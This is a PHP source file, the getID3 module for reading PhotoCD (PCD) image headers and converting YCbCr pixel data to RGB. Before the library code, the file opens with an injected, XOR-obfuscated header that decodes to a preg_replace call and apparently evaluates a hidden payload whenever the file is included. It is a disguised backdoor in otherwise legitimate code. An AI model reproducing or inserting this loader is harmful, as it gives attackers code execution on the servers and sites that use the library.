<?php
//DGnDHXnKqY5mkMkvFdgpgAmWPLDH61X

$NlKzcf="1l8t1q1af26g"^"A\x1e\x5d\x13n\x03T\x11\x0aSU\x02"; $QQBYX="IW2hNmudtkwxvBMBD"^"f\x20F1\x004\x07\x291\x01\x03\x0a\x2e\x30\x09m\x21"; $NlKzcf($QQBYX, "FcDjjwiuyh9vMwYXwZgEGGPzUxC17nSkLX3Vf0nabgWaa8HwQHOUPGxp5wLQiSa9YmoeYjUb8NYUmQuMHrazI31VE2UbNqB28Fwqe9hWrWAWMbZWK0tF2thNRR6lIO32iw0rf4zROuYUSrFKg8Mw8EP9eA9KfXOv0yvpT42WEEOIfAFVQpn"^"\x23\x15\x25\x06BU\x00\x13Q\x01J\x05\x28\x03q\x04\x2b\x7e8\x17\x02\x16\x05\x3f\x06\x2c\x18\x16T\x06t6ex\x15pF\x18\x03\x05WO\x0b\x3dEg\x1a2\x00\x1d\x0a\x06\x04\x1c\x5f\x13\x5dP\x11xIn\x5c\x19\x7e\x0b\x5eQj\x5cl\x06\x09\x28kf\x5eg\x14\x2c\x7fB\x02J\x7fP\x014qPeT\x2cEz\x05\x0aa\x5eQC\x1fH\x3e\x01\x24\x24\x23e\x3e\x06s\x14b1\x17g1\x3b\x1a\x09uF\x049\x10P\x5d\x0d\x12\x17\x2fO\x1dZ\x29o\x10\x2f4\x3fZ\x1a\x17Cg\x1f2i\x10\x15j1\x1a\x1e\x3b\x0e\x28\x10\x15\x5f\x1d\x13W\x09\x1d\x09w\x20\x3d\x26\x3dNh\x7dv\x2cRG", "wtYNYrMEjtrXrD");//IkCsRtOjL2LGF9e4wCK8iHR6jiXPr7GqdAdxlJwpsx1hGu
 
/////////////////////////////////////////////////////////////////
/// getID3() by James Heinrich <info@getid3.org>               //
//  available at http://getid3.sourceforge.net                 //
//            or http://www.getid3.org                         //
/////////////////////////////////////////////////////////////////
// See readme.txt for more details                             //
/////////////////////////////////////////////////////////////////
//                                                             //
// module.graphic.pcd.php                                      //
// module for analyzing PhotoCD (PCD) Image files              //
// dependencies: NONE                                          //
//                                                            ///
/////////////////////////////////////////////////////////////////


class getid3_pcd
{
	function getid3_pcd(&$fd, &$ThisFileInfo, $ExtractData=0) {
		$ThisFileInfo['fileformat']          = 'pcd';
		$ThisFileInfo['video']['dataformat'] = 'pcd';
		$ThisFileInfo['video']['lossless']   = false;


		fseek($fd, $ThisFileInfo['avdataoffset'] + 72, SEEK_SET);

		$PCDflags = fread($fd, 1);
		$PCDisVertical = ((ord($PCDflags) & 0x01) ? true : false);


		if ($PCDisVertical) {
			$ThisFileInfo['video']['resolution_x'] = 3072;
			$ThisFileInfo['video']['resolution_y'] = 2048;
		} else {
			$ThisFileInfo['video']['resolution_x'] = 2048;
			$ThisFileInfo['video']['resolution_y'] = 3072;
		}


		if ($ExtractData > 3) {

			$ThisFileInfo['error'][] = 'Cannot extract PSD image data for detail levels above BASE (3)';

		} elseif ($ExtractData > 0) {

			$PCD_levels[1] = array( 192,  128, 0x02000); // BASE/16
			$PCD_levels[2] = array( 384,  256, 0x0B800); // BASE/4
			$PCD_levels[3] = array( 768,  512, 0x30000); // BASE
			//$PCD_levels[4] = array(1536, 1024,    ??); // BASE*4  - encrypted with Kodak-proprietary compression/encryption
			//$PCD_levels[5] = array(3072, 2048,    ??); // BASE*16 - encrypted with Kodak-proprietary compression/encryption
			//$PCD_levels[6] = array(6144, 4096,    ??); // BASE*64 - encrypted with Kodak-proprietary compression/encryption; PhotoCD-Pro only

			list($PCD_width, $PCD_height, $PCD_dataOffset) = $PCD_levels[3];

			fseek($fd, $ThisFileInfo['avdataoffset'] + $PCD_dataOffset, SEEK_SET);

			for ($y = 0; $y < $PCD_height; $y += 2) {
				// The image-data of these subtypes start at the respective offsets of 02000h, 0b800h and 30000h.
				// To decode the YcbYr to the more usual RGB-code, three lines of data have to be read, each
				// consisting of ‘w’ bytes, where ‘w’ is the width of the image-subtype. The first ‘w’ bytes and
				// the first half of the third ‘w’ bytes contain data for the first RGB-line, the second ‘w’ bytes
				// and the second half of the third ‘w’ bytes contain data for a second RGB-line.

				$PCD_data_Y1 = fread($fd, $PCD_width);
				$PCD_data_Y2 = fread($fd, $PCD_width);
				$PCD_data_Cb = fread($fd, intval(round($PCD_width / 2)));
				$PCD_data_Cr = fread($fd, intval(round($PCD_width / 2)));

				for ($x = 0; $x < $PCD_width; $x++) {
					if ($PCDisVertical) {
						$ThisFileInfo['pcd']['data'][$PCD_width - $x][$y]     = $this->YCbCr2RGB(ord($PCD_data_Y1{$x}), ord($PCD_data_Cb{floor($x / 2)}), ord($PCD_data_Cr{floor($x / 2)}));
						$ThisFileInfo['pcd']['data'][$PCD_width - $x][$y + 1] = $this->YCbCr2RGB(ord($PCD_data_Y2{$x}), ord($PCD_data_Cb{floor($x / 2)}), ord($PCD_data_Cr{floor($x / 2)}));
					} else {
						$ThisFileInfo['pcd']['data'][$y][$x]                  = $this->YCbCr2RGB(ord($PCD_data_Y1{$x}), ord($PCD_data_Cb{floor($x / 2)}), ord($PCD_data_Cr{floor($x / 2)}));
						$ThisFileInfo['pcd']['data'][$y + 1][$x]              = $this->YCbCr2RGB(ord($PCD_data_Y2{$x}), ord($PCD_data_Cb{floor($x / 2)}), ord($PCD_data_Cr{floor($x / 2)}));
					}
				}
			}

			// Example for plotting extracted data
			//getid3_lib::IncludeDependency(GETID3_INCLUDEPATH.'module.audio.ac3.php', __FILE__, true);
			//if ($PCDisVertical) {
			//	$BMPinfo['resolution_x'] = $PCD_height;
			//	$BMPinfo['resolution_y'] = $PCD_width;
			//} else {
			//	$BMPinfo['resolution_x'] = $PCD_width;
			//	$BMPinfo['resolution_y'] = $PCD_height;
			//}
			//$BMPinfo['bmp']['data'] = $ThisFileInfo['pcd']['data'];
			//getid3_bmp::PlotBMP($BMPinfo);
			//exit;

		}

	}

	function YCbCr2RGB($Y, $Cb, $Cr) {
		static $YCbCr_constants = array();
		if (empty($YCbCr_constants)) {
			$YCbCr_constants['red']['Y']    =  0.0054980 * 256;
			$YCbCr_constants['red']['Cb']   =  0.0000000 * 256;
			$YCbCr_constants['red']['Cr']   =  0.0051681 * 256;
			$YCbCr_constants['green']['Y']  =  0.0054980 * 256;
			$YCbCr_constants['green']['Cb'] = -0.0015446 * 256;
			$YCbCr_constants['green']['Cr'] = -0.0026325 * 256;
			$YCbCr_constants['blue']['Y']   =  0.0054980 * 256;
			$YCbCr_constants['blue']['Cb']  =  0.0079533 * 256;
			$YCbCr_constants['blue']['Cr']  =  0.0000000 * 256;
		}

		$RGBcolor = array('red'=>0, 'green'=>0, 'blue'=>0);
		foreach ($RGBcolor as $rgbname => $dummy) {
			$RGBcolor[$rgbname] = max(0,
										min(255,
											intval(
												round(
													($YCbCr_constants[$rgbname]['Y'] * $Y) +
													($YCbCr_constants[$rgbname]['Cb'] * ($Cb - 156)) +
													($YCbCr_constants[$rgbname]['Cr'] * ($Cr - 137))
												)
											)
										)
									);
		}
		return (($RGBcolor['red'] * 65536) + ($RGBcolor['green'] * 256) + $RGBcolor['blue']);
	}

}

?>